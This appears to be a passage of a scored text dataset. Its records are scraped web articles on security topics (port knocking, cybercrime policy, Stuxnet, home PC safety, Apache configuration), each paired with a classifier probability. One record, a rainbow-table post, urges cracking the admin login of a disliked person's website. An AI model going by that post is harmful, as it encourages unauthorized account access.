allocation of any kind - everything is stored in static, fixed-size data structures.) Replay and man-in-the-middle attacks are also effectively useless. Ostiary limits how fast it accepts connections, enforcing low CPU and network usage. (The first production Ostiary server was a 16MHz 68030 machine.) Client requirements are even lower: Clients are available for Palm Pilots and even Windows. Unlike a procmail-based solution, where you can put arbitrary commands (with arguments) in the message, Ostiary can only run the fixed set of commands you have preconfigured. The only argument it supplies to the commands is the IP address of the client that initiated the command. It requires an active network connection (unlike Xringd) and an open port (unlike port knocking or sniffing), which may entail configuring a firewall to open a new port. (Although one could run Ostiary on, say, port 22, and upon receipt of the correct command, it could terminate itself and spawn sshd...) Since Ostiary uses TCP, it is as reliable as the network it uses to communicate. Problems with miscounted phone rings (a la Xringd) or randomly dropped packets (a la port knocking) are not a concern. The following table summarizes the pros and cons of the various systems outlined above. \"Replay\" and \"Man-in-the-middle\" indicate if the default system is vulnerable to the corresponding attacks. \"Command arguments\" indicates if the system can run arbitrary commands with arguments. \"CPU load\" indicates that CPU time can be a significant consideration. \"Special client\" indicates that a specific client program is needed to work with that system. |System||Xringd||Mail filter||Port knocking||Sniffers||Lando||Ostiary| None of these approaches is right for everyone. But all of them can be used to make attacks at least more inconvenient, and in many cases far more difficult. Remember, though, to analyze their pros and cons relative to your specific situation. Also remember that true security is a process, not a goal - you can never just install some software and be done thinking about it. Ray Ingles has been involved with Linux since 1995. In addition to being an active member of the Metro Detroit Linux User's Group, he has made minor contributions to the UPS HOWTO and the Linux",
        "prob": "tensor([[2.0816e-06, 1.0000e+00]])"
    },
    {
        "text": "20 June 2012 by Pelle Neroth Another example: Two years ago cyber thieves stole 30 million euros' worth of carbon allowances from the European carbon trading exchange, forcing trading to cease for some days on order of the European Commission. A third recent incident: the social and business networking website LinkedIn had six million user passwords leaked online after users were targeted by fake emails asking them to confirm their login details in a so called \"phishing attack\" by hackers. Cyber crime is a broad church, including denial of service attacks, attacks on critical infrastructures (like the Stuxnet worm), botnets which marshal thousands of innocent owners' computers to do cyber criminals' work, malware, online frauds, and child pornography picture trading. It is a costly problem - £27bn a year just in the UK, according to a 2011 Home Office study and it is growing threat as more and more services like taxes and benefits payments migrate online. It is also under reported. A lot of scams affect millions of individuals but only small sums per individual, so many feel it's not worth going to the police about. And companies have their own reasons. Their incentives are misaligned. They are unwilling to disclose problems for fear of losing customers as their reputations would take a hit for being insecure. Many do short term fixes on their systems and price fraud into their business model. And keep very quiet about breaches. Law enforcement agencies are arguably understaffed, though the situation is getting better. Europol, the EU policing agency, has just 7 out of 457 staff dealing with cybercrime from its shiny new offices in the Hague, according to a Commission-funded report. CEPOL, the UK based European police college, does not have cybercrime experts among its 42 staff. Law enforcement agencies are put off by jurisdictional failures from covering crimes of an essentially global and dispersed nature. Communicating by instant messenger or through bulletin boards websites, malware writers, malware distributors, and credit card abusers are all different people who may never meet and are located in different countries. Clear up rates are low. A dozen EU countries have separately adopted national cybercrime strategies, among them the UK. The cybercrime unit will be an important part of the new National Crime Agency launching next year, according to the UK's \"Mr Cyber\", cabinet office minister Francis Maude. But cybercrime is one of those areas crying out for international coordination and several initiatives are afoot. NATO is developing its own strategy, and has its own cyber warfare centre in Tallinn, Estonia. The EU itself at the end of May agreed to set up a cybercrime centre (ECCC) at Europol, consisting of 55 persons that will help coordinate national efforts. The European Commission will also be proposing new legislation in the third quarter of 2012 making notification of security breaches compulsory for companies in the energy, transport, banking and financial sectors. The requirement to report could worsen the reputational damage to companies that have experienced security breaches. So rather than do that they will spend more on security to lower their vulnerability, officials say. Telecoms and internet firms are already subject to reporting obligations. You have to ask whether the ECCC is an effective solution, though. According to the Commission's own estimates, 8 trillion dollars a year changes hands through e-commerce. The Commission-funded feasibility study* proposes a three million euro budget for the ECCC for its first year of operation. That is not a lot when you look at the science prizes of up to one billion the EU is handing out for basic research projects - or compared to the $57bn budget for the US Department of Homeland Security. Pelle Neroth -- EU correspondent Posted By: Pelle Neroth @ 20 June 2012 08:28 AM Brussels FuseTalk Standard Edition - © 1999-2013 FuseTalk Inc. All rights reserved. \"Summer is on the way, so we turn our attention to a few leisurely pursuits - and some not-so leisurely ones...\" - Greenpeace frowns at Centrica's getting a shale-gas venture stake - World’s most advanced comms satellite shipped to launch site - HMS Queen Elizabeth nears completion - Scientist to benefit from exascale supercomputer deal - Dinosaurs’ app uses augmented reality - Chinese space capsule reaches its ‘Heavenly Palace’ - Transformers Vector Group [04:55 pm 19/06/13] - E&T magazine - Debate - HS2, the need for speed [01:33 pm 18/06/13] - Creating an Iphone App [05:50 pm 17/06/13] - CO2 is good [07:29 pm 16/06/13] - DECC-EDF makes yet another attempt to fund 3rd Generation Nuclear at any cost [05:02 pm 15/06/13] Tune into our latest podcast",
        "prob": "tensor([[2.1502e-06, 1.0000e+00]])"
    },
    {
        "text": "Whatever its origin, the Stuxnet worm provided something that few publicly-debated online incidents have offered to date. For at least 15 years, security experts have warned that cyber attacks would one day strike at “critical infrastructure” – whether it’s power grids, energy supply, air traffic control (in the more extreme imagination of Richard Clarke, at least), emergency services and so on. Real-world incidents have been limited, however: most countries have no single electricity “off-switch” accessible from the Internet, for example. In attacking SCADA software, Stuxnet has acted as a proof-of-concept for something rarely seen in the wild. Arguably, it also demonstrated that environments like SCADA systems are, to date, not typically Internet-connected: its medium of infection was USB keys. But in a world that’s probably growing weary of the jump-at-shadows mindset of IT security journalism, Stuxnet wasn’t a shadow but a real event. Dr Prescott Winter, former director and CIO of the US National Security Agency and now CTO (Public Sector) for security vendor ArcSight, argues that it’s time for governments to take a more active role in finding ways to secure the Internet. Speaking to journalists in Sydney in early October as part of an ArcSight national roadshow, Dr Winter said that while private industry (particularly in America) might chafe at government intervention and regulation of the online world, it’s as inevitable as regulation of air traffic became in the 20th century. The prime manifestation of the problem, Dr Winter said, is the ongoing problem of the “botnet”. Individuals at home aren’t protected, he told the roadshow; their computers become incubation grounds for botnets. “Some kind of protective process to clean that up is absolutely essential,” he said. “There are botnets residing in millions of home computers around the world, and those can be turned-on ‘like that’.” Today’s “scattershot” approach to the botnet problem isn’t enough protection, he said: “we have bans on aircraft ... bans on ‘bad packets’ is an area governments need to work on.” And that in itself is a challenge. The “bad packet” problem is international – and around the world, the relationship between the government and the private sector changes from country to country. Dr Winter said America may not even be the best country to take the lead in protecting Internet users, because of its historical gulf between government and the private sector. As a result, an effort like the IIA’s Internet code of practice is “almost unimaginable in the US. “I think this case in Australia is going to be very interesting to watch. It seems to have come about with a group of the leading ISPs and service providers coming together to design this solution. “There are a lot of things it doesn’t have in it yet – but as an initial outline for a policy framework to clean up ... the Australian part of the Internet, it is certainly a commendable start. Eventually, you probably want to make sure that you have all your service providers involved.” Worms and the Real World Given that “physical attacks” – damage to infrastructure, attacks on emergency services and the like – hold such a high profile in the popular mind, it’s interesting that Dr Winter nominated attacks against intellectual property as today’s leading concern. One reason, he said, is that “some action has been taking in protecting the critical systems ... for example, the FAA is getting a complete rebuild from the ground up.” The shift in emphasis “from catastrophic failure to IP”, Dr Winter said, is because “the steady drain of intellectual property out of the leading technical nations of the world is a major cause for concern. The investment in developing products and services, he said, is in danger of “leaking” to countries like China, but “IP protection and the integrity of the supply chain are currently lower on most peoples’ threat radar than a catastrophic cyber ‘Pearl Harbour’”. Security, software and the Cloud Security would seem to provide a great marketing entree for cloud providers: if everything the home user needs can be hosted by a cloud provider, the user’s exposure to threats could fall dramatically. However, it’s not playing out that way. “I don’t think there’s as much progress as any of us would like to see ... we have had some discussions with people at Microsoft about trust models you can begin to build into the Internet.” “App store” markets are another area Dr Winter would like to see paying more attention to security, since users place an implicit trust in the integrity of the software they download from an app store. That, however, leads to the vexed question of software quality. If cloud providers and app sellers are expected to warrant that their software is secure, shouldn’t a similar requirement apply to the whole software industry, which typically escapes liability with disclaimers? Yes: “The software industry has gotten away with murder on this point forever,” Dr Winter said. “Deploy, then fix, is the old habit of the software industry, and that model isn’t viable in the cloud.” He said software quality processes need to be put into place industry-wide (and world-wide), and this will represent a culture-shock for the software industry.",
        "prob": "tensor([[2.3255e-06, 1.0000e+00]])"
    },
    {
        "text": "Have you ever noticed that some things in certin places on the internet on occasion require the use of a password, or log-in of some kind? Ever wonder if there was possibly a way around this “barrier”? Maybe you forgot a password to your msn account, or maybe someone you hate has a website that you’d like to see destroyed… Eitherway, a password or login is required and your sitting in your chair doing nothing usefull… You may not know alot about it yourself, but your aware of “hackers” and “crackers”. Ask yourself an honest question… What do they know that you dont? Why is it that a 13 year old halo nerd can steel my bank info and ring up a huge bill on my visa? What am i missing here… Rainbow Tables. Contrary to what the name might imply, Rainbow tables are an extreamly powerful and useful tool in the computer world, and they are alot less complicated then you may think. What are they? (accoarding to Wikipedia) A rainbow table is a lookup table offering a time-memory tradeoff used in recovering the plaintext password from a password hash generated by a hash function, often a cryptographic hash function. A common application is to make attacks against hashed passwords feasible. Salt is often employed with hashed passwords to avoid this attack. (In English More Less) Rainbow tables use a refined algorithm by using a number of different reduction functions to create multiple parallel chains within a single “rainbow” table, reducing the probability of false positives from accidental chain collisions, and thus increasing the probability of a correct password crack. As well as increasing the probability of a correct crack for a given table size, the use of multiple reduction functions also greatly increases the speed of lookups. See the paper cited below for details. Rainbow tables are specific to the hash function they were created for e.g., MD5 tables can crack only MD5 hashes. The theory of this technique was first pioneered by Philippe Oechslin as a fast form of time-memory tradeoff (PDF), which he implemented in the Windows password cracker Ophcrack. The more powerful RainbowCrack program was later developed that can generate and use rainbow tables for a variety of character sets and hashing algorithms, including LM hash, MD5, SHA1, etc. What that all means isssss??? They allow you to hack the shit out of things If theres a password you need, or an account name to something, you can use Rainbow Tables to “recover” them. Say your friend has a clan. Part of his clan is a website. You dont like his website. With Rainbow Tables you could figure out the admin’s username and his password, and in return, log in and make changes WHY DOESNT EVERYONE HAVE THEM IF THEIR SO 13ET?? 1) They are underground. Not many people know they even exsist. 2) They are fairly complicated as first look, but have a HUGE community backing them up. 3) They are massive in size. A shitty set of tables runs at about 8 Gigabytes, and would prove very in-effective for most uses. If you wanted to “crack” serious things, you’d need a set running about 120 Gigabytes in size. Currently they are working on a set that are approx. 420 Gigabytes in size. So basically, unless you want to wait 6 months for download your out of luck with getting them. (However some programs are offered where they will ship them to you on a hard drive the download)",
        "prob": "tensor([[5.6283e-05, 9.9994e-01]])"
    },
    {
        "text": "Web users are getting anxious about their personal data being collected by search engines for targeted advertising, according to a recent report released by the Pew Internet. The Pew Internet & American Life survey showed that 65 percent of Internet users feel that it’s a bad thing if a search engine is collecting information about their searches and then using it to rank future search results, as it would limit information users get online and what search results they see. 73 percent of the respondents said that they would not be OK with a search engine keeping track of searches and personalizing future search results, as it would be an invasion of their privacy. Only 29% of those surveyed said that it’s a good thing that search engines collect information about the searches and use it to rank future search results, because it gives users results that are more relevant to them, while 23% said that they are Ok with search engines keeping track of their searches and using that information to personalize their future search results, even if it means they are gathering information about them. Most of the users are not aware of the ways they can limit the information that websites gather about them. Only 38% of Internet users said that they knew of things they could do to limit personal information. Among this group, one common strategy people used to limit personal data collection was to delete their web history. Despite these concerns about online privacy, the Pew research found that users’ overall views of search engine performance is positive. Use of search engine is still one of the most popular online activities, rivaled only by email. Users expressed high levels of confidence in the capabilities of search engines, with 91% stating that they always or most of the time find the information they are seeking, and 73% stating that most or all the information they find using search engines is accurate and trustworthy. As expected, Google topped the list of most popular search engines, with 83 percent of stating that they used Google to carry out most of their searches.",
        "prob": "tensor([[3.6564e-06, 1.0000e+00]])"
    },
    {
        "text": "Recently 4800 plus credit cards of Saudi Arabia were hacked by Israeli Hackers and after that they put all information about these cards on internet too. So internet is not a safe place unless you take some security measures in order to protect computer from malicious attacks. Computer experts says that if you connect new computer to the internet than this new computer will be effected by viruses with few minutes. That’s unsafe internet is, so its important that you first secure your computer and than connect it with internet otherwise you will be in the hands of some hacker. 1. Install an Antivirus Software Antivirus software is the first line of defense for any computer out there on internet and without it your are take very big risk of your precious data and files. Although Windows operating system are getting much and much secure after time but hackers can still find security loop holes in your system and can take it down. There are mainly two types of antivirus software’s available on internet free and paid. Both works well but premium software allows to update and use more advanced features which are not available in the free version. The first thing you should do is to install a free Norton antivirus software but if you cannot afford to buy antivirus software than you can also use free Norton Internet security 2012 giveaway and get your free key. The way is works is very simple, companies want to promote there software and hence give some free product keys to the websites which review their products. These blogs than gives software’s to general public via giveaways in which you can easily participate. After you get your antivirus software, install it and update its virus definitions in order to maximizes its protection ability. 2. Change and Update you Browser Unfortunately the most reliable browser of last century is the most UN-reliable browser of 21st century. I am talking about Microsoft Internet Explorer. I don’t know why Microsoft is not taking it seriously and they are far behind from other internet browsers like Mozilla Firefox and Google Chrome.So if you are one of those who are still using Microsoft Internet explorer than my friend your laptop can any time get hacked or infected by viruses. If you are using browser other than Microsoft Internet Explorer than its essential that you upgrade your browser when ever a new update is available. Generally Mozilla Firefox Nightly updates are released every month so its better to check manually or set your browser settings to auto so that it can automatically checks and updates your browsers. Now a days browsers plugins and extensions are very popular among young guys but let me tell you that these extensions can inject some malicious code into your browser so its better to not use these plugins. 3. Use Firewall Program Just installing antivirus software is not enough in order to make your system 100 percent secure. Now a days any antivirus programs are equipped with firewalls but unfortunately these are not good for your system. Try to use third part firewalls as these are created by professional and they will also provide you full customer support. Firewall is another option which will make sure that only the request generated by your system will enter in your computer. When ever you want to visit some website your computer sent signals to the out side world. Now of course these signals have to cross whole world and than return to your computer but the problem is that any one can see you computer on the internet and send requests to enter into your system. Requests generated by outsiders will totally be rejected. This way you can easily block hackers attacks. Although windows 7 firewall is very good but in addition to that you can also install ZoneAlarm, GFI etc. 4. Try to Avoid Adobe Flash Player and Acrobat Reader You may be wondering what is this. These are the most used applications on internet and why they are not safe. Yes but this is the problem with these applications. There popularity makes them ideal for hackers to target and hence find security loop holes in it. Adobe Flash is so unreliable that Apple has not chosen to add support for this application in there gadgets. Now i know you are saying that without these software your work can be effected so let me tell you some alternatives that can help you. You can use HTML5 instead of Flash which worlds perfectly fine and recently YouTube is also experimenting with HTML5 in their videos. If this project will be successful than they will also adapt this technology. For acrobat files you can use another free alternative and that is Google chrome browser. Not many people know that Chrome can also open and read Acrobat files so go and install it now if you don’t have it. 5. Stay away from Malware Websites One of the main reason that your computer or laptop is effected by some virus or malicious software’s is that you have visited some bad URL or website that redirects to some malicious website. These websites consists of websites which give illegal keys and breaks software’s codes to use into your system. But as you may know that they are genius people so they will also do some trick with you and inject some code int you browser. I am using browser again and again because its the front line application that interact with out side world. Also stay away from websites which will promise you to make you millionaire over night or give you money. You can imagine that if some body is offering you free money than why not he is taking this money and become rich. So please stay away from these stupid schemes. You can also use free Anit Malware software to detect these websites. Last but not least never accept files by outsiders while chatting, via Email or some other source. Always update your all software’s including antivirus, programs you use or internet browsers.",
        "prob": "tensor([[2.0598e-06, 1.0000e+00]])"
    },
    {
        "text": "The current version of Apache is 1.3.9. The main Apache site is at http://www.apache.org/. Another good source of information is Apacheweek at http://www.apacheweek.com/. The Apache documentation is ok, so I'm not going to go into detail in setting up apache. The documentation is on the website and is included with the source (in HTML format). There are also text files included with the source, but the HTML version is better. The documentation should get a whole lot better once the Apache Documentation Project gets under way. Right now most of the documents are written by the developers. Not to discredit the developers, but they are a little hard to understand if you don't know the terminology. Apache is included in the Red Hat, Slackware, and OpenLinux distributions. Although they may not be the latest version, they are very reliable binaries. The bad news is you will have to live with their directory choices (which are totally different from each other and the Apache defaults). The source is available from the Apache web site at http://www.apache.org/dist/ Binaries are are also available at apache at the same place. You can also get binaries from sunsite at ftp://sunsite.unc.edu/pub/Linux/apps/www/servers/. And for those of us running Red Hat the latest binary RPM file can usually be found in the contrib directory at ftp://ftp.redhat.com/pub/contrib/i386/ If your server is going to be used for commercial purposes, it is highly recommended that you get the source from the Apache website and compile it yourself. The other option is to use a binary that comes with a major distribution. For example Slackware, Red Hat, or OpenLinux distributions. The main reason for this is security. An unknown binary could have a back door for hackers, or an unstable patch that could crash your system. This also gives you more control over what modules are compiled in, and allows you to set the default directories. It's not that difficult to compile Apache, and besides you not a real Linux user until you compile your own programs ;) First untar the archive to a temporary directory. Next change to the src directory. Then edit the Configuration file if you want to include any special modules. The most commonly used modules are already included. There is no need to change the rules or makefile stuff for Linux. Next run the Configure shell script ./Configure). Make sure it says Linux platform and gcc as the compiler. Next you may want to edit the httpd.h file to change the default directories. The server home (where the config files are kept) default is /usr/local/etc/httpd/, but you may want to change it to just /etc/httpd/. And the server root (where the HTML pages are served from) default is /usr/local/etc/httpd/htdocs/, but I like the directory Red Hat default for Apache). If you are going to be using su-exec (see special features below) you may want to change that directory too. The server root can also be changed from the config files too. But it is also good to compile it in, just encase Apache can't find or read the config file. Everything else should be changed from the config files. Finally run make to compile Apache. If you run in to problems with include files missing, check the following things. Make sure you have the kernel headers (include files) installed for your kernel version. Also make sure you have these symbolic links in place: Links can be made with /usr/include/linux should be a link to /usr/src/linux/include/linux /usr/include/asm should be a link to /usr/src/linux/include/asm /usr/src/linux should be a link to the Linux source directory (ex.linux-2.0.30) ln -s, it works just like the cp command except it makes a link ( ln -s source-dir destination-link) When make is finished there should be an executable named httpd in the directory. This needs to be moved in to a bin directory. /usr/local/sbin would be good choices. Copy the conf, logs, and icons sub-directories from the source to the server home directory. Next rename 3 of the files files in the conf sub-directory to get rid of the -dist extension (ex. There are also several support programs that are included with Apache. They are in the support directory and must be compiled and installed separately. Most of them can be make by using the makefile in that directory (which is made when you run the main Configure script). You don't need any of them to run Apache, but some of them make the administrators job easier. Now you should have four files in your conf sub-directory (under your server home directory). The httpd.conf sets up the server daemon (port number, user, etc). The srm.conf sets the root document tree, special handlers, etc. The access.conf sets the base case for access. Finally mime.types tells the server what mime type to send to the browser for each The configuration files are pretty much self-documented (plenty of comments), as long as you understand the lingo. You should read through them thoroughly before putting your server to work. Each configuration item is covered in the Apache documentation. mime.types file is not really a configuration file. It is used by the server to translate file extensions into mime-types to send to the browser. Most of the common mime-types are already in the file. Most people should not need to edit this file. As time goes on, more mime types will be added to support new programs. The best thing to do is get a new mime-types file (and maybe a new version of the server) at that time. Always remember when you change the configuration files you need to restart Apache or send it the SIGHUP signal with kill for the changes to take effect. Make sure you send the signal to the parent process and not any of the child processes. The parent usually has the lowest process id number. The process id of the parent is also in the httpd.pid file in the log directory. If you accidently send it to one of the child processes the child will die and the parent will restart it. I will not be walking you through the steps of configuring Apache. Instead I will deal with specific issues, choices to be made, and special features. I highly recommend that all users read through the security tips in the Apache documentation. It is also available from the Apache website at http://www.apache.org/docs/mics/security_tips.html. Virtual Hosting is when one computer has more than one domain name. The old way was to have each virtual host have its own IP address. The new way uses only one IP address, but it doesn't work correctly with browsers that don't support HTTP 1.1. My recommendation for businesses is to go with the IP based virtual hosting until most people have browsers that support HTTP 1.1 (give it a year or two). This also gives you a more complete illusion of virtual hosting. While both methods can give you virtual mail capabilities (can someone confirm this?), only IP based virtual hosting can also give you virtual FTP as well. If it is for a club or personal page, you may want to consider shared IP virtual hosting. It should be cheaper than IP based hosting and you will be saving precious IP addresses. You can also mix and match IP and shared IP virtual hosts on the same server. For more information on virtual hosting visit Apacheweek at http://www.apacheweek.com/features/vhost. In this method each virtual host has its own IP address. By determining the IP address that the request was sent to, Apache and other programs can tell what domain to serve. This is an incredible waste of IP space. Take for example the servers where my virtual domain is kept. They have over 35,000 virtual accounts, that means 35,000 IP addresses. Yet I believe at last count they had less than 50 servers running. Setting this up is a two part process. The first is getting Linux setup to accept more than one IP address. The second is setting up apache to serve the virtual hosts. The first step in setting up Linux to accept multiple IP addresses is to make a new kernel. This works best with a 2.0 series kernel (or higher). You need to include IP networking and IP aliasing support. If you need help with compiling the kernel see the kernel howto. Next you need to setup each interface at boot. If you are using the Red Hat Distribution then this can be done from the control panel. Start X-windows as root, you should see a control panel. Then double click on network configuration. Next goto the interfaces panel and select your network card. Then click alias at the bottom of the screen. Fill in the information and click done. This will need to be done for each virtual host/IP address. If you are using other distributions you may have to do it manually. You can just put the commands in the rc.local file in /etc/rc.d (really they should go in with the networking stuff). You need to have a route command for each device. The aliased addresses are given a sub device of the main one. For example eth0 would have aliases eth0:0, eth0:1, eth0:2, etc. Here is an example of configuring a aliased device: You can also add a broadcast address and a netmask to the ifconfig command. If you have alot of aliases you may want to make a for loop to make it easier. For more information see the IP alias mini howto. ifconfig eth0:0 192.168.1.57 route add -host 192.168.1.57 dev eth0:0 Then you need to setup your domain name server (DNS) to serve these new domains. And if you don't already own the domain names, you need to contact the Internic to register the domain names. See the DNS-howto for information on setting up your DNS. Finally you need to setup Apache to server the virtual domain correctly. This is in the httpd.conf configuration file near the end. They give you an example to go by. All commands specific to that virtual host are put in virtualhost directive tags. You can put almost any command in there. Usually you set up a different document root, script directory, and log files. You can have almost unlimited number of virtual hosts by adding virtualhost directive tags. In rare cases you may need to run separate servers if a directive is needed for a virtual host, but is not allowed in the virtual host tags. This is done using the bindaddress directive. Each server will have a different name and setup files. Each server only responds to one IP address, specified by the bindaddress directive. This is an incredible waste of system resources. This is a new way to do virtual hosting. It uses a single IP address, thus conserving IP addresses for real machines (not virtual ones). In the same example used above those 30,000 virtual hosts would only take 50 IP addresses (one for each machine). This is done by using the new HTTP 1.1 protocol. The browser tells the server which site it wants when it sends the request. The problem is browsers that don't support HTTP 1.1 will get the servers main page, which could be setup to provide a menu of virtual hosts available. That ruins the whole illusion of virtual hosting. The illusion that you have your own server. The setup is much simpler than the IP based virtual hosting. You still need to get your domain from the Internic and setup your DNS. This time the DNS points to the same IP address as the original domain. Then Apache is setup the same as before. Since you are using the same IP address in the virtualhost tags, it knows you want Shared IP virtual hosting. There are several work arounds for older browsers. I'll explain the best one. First you need to make your main pages a virtual host (either IP based or shared IP). This frees up the main page for a link list to all your virtual hosts. Next you need to make a back door for the old browsers to get in. This is done using ServerPath directive for each virtual host inside the directive. For example by adding ServerPath /mysite/ to www.mysite.com old browsers would be able to access the site by www.mysite.com/mysite/. Then you put the default page on the main server that politely tells them to get a new browser, and lists links to all the back doors of all the sites you host on that machine. When an old browser accesses the site they will be sent to the main page, and get a link to the correct page. New browsers will never see the main page and will go directly to the virtual hosts. You must remember to keep all of your links relative within the web sites, because the pages will be accessed from two different URL's (www.mysite.com I hope I didn't lose you there, but its not an easy workaround. Maybe you should consider IP based hosting after all. A very similar workaround is also explained on the apache website at http://www.apache.org/manual/host.html. If anyone has a great resource for Shared IP hosting, I would like to know about it. It would be nice to know what percent of browsers out there support HTTP 1.1, and to have a list of which browsers and versions support HTTP 1.1. There are two different ways to give your users CGI script capability. The first is make everything ending in .cgi a CGI script. The second is to make script directories (usually named could also use both methods. For either method to work the scripts must be world executable ( chmod 711). By giving your users script access you are creating a big security risk. Be sure to do your homework to minimize the security risk. I prefer the first method, especially for complex scripting. It allows you to put scripts in any directory. I like to put my scripts with the web pages they work with. For sites with allot of scripts it looks much better than having a directory full of scripts. This is simple to setup. First uncomment the at the end of the srm.conf file. Then make sure all your directories have option ExecCGI or All in the Making script directories is considered more secure. To make a script directory you use the ScriptAlias directive in the srm.conf file. The first argument is the Alias the second is the actual directory. For example ScriptAlias /cgi-bin/ /usr/httpd/cgi-bin/ would make /usr/httpd/cgi-bin able to execute scripts. That directory would be used whenever someone asked for the directory /cgi-bin/. For security reasons you should also change the properties of the directory to Options none, AllowOveride none in the access.conf (just uncomment the example that is there). Also do not make your script directories subdirectories of your web page directories. For example if you are serving pages from /home/httpd/html/, don't make the /home/httpd/html/cgi-bin; Instead make it If you want your users to have there own script directories you can use ScriptAlias commands. Virtual hosts should have there ScriptAlias command inside the virtualhost directive tags. Does anyone know a simple way to allow all users to have a cgi-bin directory without individual ScriptAlias There are two different ways to handle user web directories. The first is to have a subdirectory under the users home directory (usually The second is to have an entirely different directory tree for web directories. With both methods make sure set the access options for these directories The first method is already setup in apache by default. Whenever a request /~bob/ comes in it looks for the public_html directory in bob's home directory. You can change the directory with the UserDir directive in srm.conf file. This directory must be world readable and executable. This method creates a security risk because for Apache to access the directory the users home directory must be world executable. The second method is easy to setup. You just need to change the UserDir directive in the srm.conf file. It has many different formats; you may want to consult the Apache documentation for clarification. If you want each user to have their own directory under /home/httpd/, you would use UserDir /home/httpd. Then when the request /~bob/ comes in it would translate to /home/httpd/bob/. Or if you want to have a subdirectory under bob's directory you would use UserDir /home/httpd/*/html. This would translate to /home/httpd/bob/html/ and would allow you to have a script directory too (for example There are two ways that apache can be run. One is as a daemon that is always running (Apache calls this standalone). The second is from the inetd super-server. Daemon mode is far superior to inetd mode. Apache is setup for daemon mode by default. The only reason to use the inetd mode is for very low use applications. Such as internal testing of scripts, small company Intranet, etc. Inetd mode will save memory because apache will be loaded as needed. Only the inetd daemon will remain in memory. If you don't use apache that often you may just want to keep it in daemon mode and just start it when you need it. Then you can kill it when you are done (be sure to kill the parent and not one of the child processes). To setup inetd mode you need to edit a few files. First in see if http is already in there. If its not then add it: Right after 79 (finger) would be a good place. Then you need to edit the /etc/inetd.conffile and add the line for Apache: Be sure to change the path if you have Apache in a different location. And the second httpd is not a typo; the inet daemon requires that. If you are not currently using the inet daemon, you may want to comment out the rest of the lines in the file so you don't activate other services as well (FTP, finger, telnet, and many other things are usually run from this daemon). http stream tcp nowait root /usr/sbin/httpd httpd If you are already running the inet deamon ( inetd), then you only need to send it the SIGHUP signal (via kill; see kill's man page for more info) or reboot the computer for changes to take effect. If you are not running inetd then you can start it manually. You should also add it to your init files so it is loaded at boot (the rc.local file may be a good The newer web publishing tools support this new method of uploading web pages by http (instead of FTP). Some of these products don't even support FTP anymore! Apache does support this, but it is lacking a script to handle the requests. This script could be a big security hole, be sure you know what you are doing before attempting to write or install one. If anyone knows of a script that works let me know and I'll include the address to it here. For more information goto Apacheweek's article at http://www.apacheweek.com/features/put. This is one of my favorite features. It allows you to password protect a directory or a file without using CGI scripts. It also allows you to deny or grant access based on the IP address or domain name of the client. That is a great feature for keeping jerks out of your message boards and guest books (you get the IP or domain name from the log files). To allow user authentication the directory must have AuthConfig set in the access.conf file. To allow access control (by domain or IP address) AllowOverrides Limit must be set for that directory. Setting up the directory involves putting an .htaccess file in the directory. For user authentication it is usually used with .htpasswd and optionally a .htgroup file. Those files can be shared among .htaccess files if you wish. For security reasons I recommend that everyone use these directives in there access.conf file: <files ~ \"/\\.ht\"> order deny,allow deny from all </files> If you are not the administrator of the system you can also put it in your .htaccess file if AllowOverride Limit is set for your directory. This directive will prevent people from looking into your access control files (.htaccess, .htpasswd, etc). There are many different options and file types that can be used with access control. Therefore it is beyond the scope of this document to describe the files. For information on how to setup User Authentication see the Apacheweek feature at http://www.apacheweek.com/features/userauth or the NCSA pages at http://hoohoo.ncsa.uiuc.edu/docs-1.5/tutorials/user.html. The su-exec feature runs CGI scripts as the user of the owner. Normally it is run as the user of the web server (usually nobody). This allows users to access there own files in CGI scripts without making them world writable (a security hole). But if you are not careful you can create a bigger security hole by using the su-exec code. The su-exec code does security checks before executing the scripts, but if you set it up wrong you will have a security hole. The su-exec code is not for amateurs. Don't use it if you don't know what you are doing. You could end up with a gaping security hole where your users can gain root access to your system. Do not modify the code for any reason. Be sure to read all the documentation carefully. The su-exec code is hard to setup on purpose, to keep the amateurs out (everything must be done manually, no make file no install scripts). The su-exec code resides in the support directory of the source. First you need to edit the suexec.h file for your system. Then you need to compile the su-exec code with this command: Then copy the suexec executable to the proper directory. The Apache default is gcc suexec.c -o suexec /usr/local/etc/httpd/sbin/. This can be changed by editing httpd.hin the Apache source and recompiling Apache. Apache will only look in this directory, it will not search the path. Next the file needs to be changed to user root ( chown root suexec) and the suid bit needs to be set ( chmod 4711 suexec). Finally restart Apache, it should display a message on the console that su-exec is being used. CGI scripts should be set world executable like normal. They will automaticaly be run as the owner of the CGI script. If you set the SUID (set user id) bit on the CGI scripts they will not run. If the directory or file is world or group writable the script will not run. Scripts owned by system users will not be run (root, bin, etc.). For other security conditions that must be met see the su-exec documentation. If you are having problems see the su-exec log file named Su-exec does not work if you are running Apache from inetd, it only works in daemon mode. It will be fixed in the next version because there will be no inetd mode. If you like playing around in source code, you can edit the http_main.c. You want to get rid of the line where Apache announces that it is using the su-exec wrapper (It wrongly prints this in front of the output of everything). Be sure and read the Apache documentation on su-exec. It is included with the source and is available on the Apache web site at http://www.apache.org/docs/suexec.html Apache has the ability to handle server side imagemaps. Imagemaps are images on webpages that take users to different locations depending on where they click. To enable imagemaps first make sure the imagemap module is installed (its one of the default modules). Next you need to uncomment .map handler at the end of the srm.conf file. Now all files ending in .map will be imagemap files. Imagemap files map different areas on the image to separate links. Apache uses map files in the standard NCSA format. Here is an example of using a map file in a web page: In this example <a href=\"/map/mapfile.map\"> <img src=\"picture.gif\" ISMAP> </a> mapfile.mapis the mapfile, and picture.gifis the image to click on. There are many programs that can generate NCSA compatible map files or you can create them yourself. For a more detailed discussion of imagemaps and map files see the Apacheweek feature at http://www.apacheweek.com/features/imagemaps. Server Side Includes (SSI) adds dynamic content to otherwise static web pages. The includes are embedded in the web page as comments. The web server then parses these includes and passes the results to the web server. SSI can add headers and footers to documents, add date the document was last updated, execute a system command or a CGI script. With the new eXtended Server Side Includes (XSSI) you can do a whole lot more. XSSI adds variables and flow control statements (if, else, etc). Its almost like having an programming language to work with. Parsing all HTML files for SSI commands would waste allot of system resources. Therefore you need to distinguish normal HTML files from those that contain SSI commands. This is usually done by changing the extension of the SSI enhanced HTML files. Usually the .shtml extension is used. To enable SSI/XSSI first make sure that the includes module is installed. srm.conf and uncomment the AddHandler directives for .shtml files. Finally you must set Options Includes for all directories where you want to run SSI/XSSI files. This is done in the access.conf file. Now all files with the extension .shtml will be parsed for SSI/XSSI commands. Another way of enabling includes is to use the XBitHack directive. If you turn this on it looks to see if the file is executable by user. If it is Options Includes is on for that directory, then it is treated as an SSI file. This only works for files with the mime type .html .htm files). This is not the preferred method. There is a security risk in 